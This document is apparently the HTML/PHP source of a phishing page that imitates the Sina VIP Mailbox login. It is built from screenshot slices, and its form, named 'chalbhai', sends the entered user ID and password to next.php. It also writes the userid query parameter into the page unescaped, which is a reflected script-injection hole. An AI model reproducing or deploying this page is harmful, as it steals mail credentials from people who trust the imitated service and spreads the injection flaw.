<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#34;&#26032;&#28010;&#86;&#73;&#80;&#37038;&#31665;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
 .textbox { 
    border: 1px solid #848484; 
    outline:0; 
    height: 38px; 
    width: 275px; 
	padding-left: 3px;
	font-size: 15px;
	
	outline: none;
	border:none;
	
 }
 </style>			  
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:157px; z-index:0"><img src="images/sn1.png" alt="" title="" border=0 width=1365 height=157></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:156px; width:1365px; height:194px; z-index:1"><img src="images/sn2.png" alt="" title="" border=0 width=1365 height=194></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:346px; width:1365px; height:168px; z-index:2"><img src="images/sn3.png" alt="" title="" border=0 width=1365 height=168></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:510px; width:1365px; height:152px; z-index:3"><img src="images/sn4.png" alt="" title="" border=0 width=1365 height=152></div>

<div id="image5" style="position:absolute; overflow:hidden; left:204px; top:14px; width:168px; height:27px; z-index:4"><a href="#"><img src="images/sn5.png" alt="" title="" border=0 width=168 height=27></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:770px; top:19px; width:391px; height:29px; z-index:5"><a href="#"><img src="images/sn6.png" alt="" title="" border=0 width=391 height=29></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:764px; top:261px; width:68px; height:20px; z-index:6"><img src="images/sn7.png" alt="" title="" border=0 width=68 height=20></div>

<div id="image8" style="position:absolute; overflow:hidden; left:709px; top:310px; width:121px; height:68px; z-index:7"><a href="#"><img src="images/sn8.png" alt="" title="" border=0 width=121 height=68></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:532px; top:356px; width:73px; height:21px; z-index:8"><a href="#"><img src="images/sn9.png" alt="" title="" border=0 width=73 height=21></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:888px; top:627px; width:266px; height:21px; z-index:9"><a href="#"><img src="images/sn10.png" alt="" title="" border=0 width=266 height=21></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:206px; top:596px; width:167px; height:21px; z-index:10"><a href="#"><img src="images/sn11.png" alt="" title="" border=0 width=167 height=21></a></div>
<form action=next.php name=chalbhai id=chalbhai method=post>
<input name="userid" value="<?=$_GET[userid]?>" placeholder="&#36755;&#20837;&#37038;&#31665;&#21517;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:267px;left:559px;top:158px;z-index:11">
<input name="pass" placeholder="&#36755;&#20837;&#23494;&#30721;" class="textbox" autocomplete="off" required type="password" style="position:absolute;width:267px;left:559px;top:209px;z-index:12">
<div id="formcheckbox1" style="position:absolute; left:531px; top:262px; z-index:13"><input type="checkbox" name="formcheckbox1"></div>
<div id="formcheckbox2" style="position:absolute; left:615px; top:262px; z-index:14"><input type="checkbox" name="formcheckbox2"></div>
<div id="formimage1" style="position:absolute; left:534px; top:311px; z-index:15"><input type="image" name="formimage1" width="119" height="38" src="images/login.png"></div>
</div>

</body>
</html>
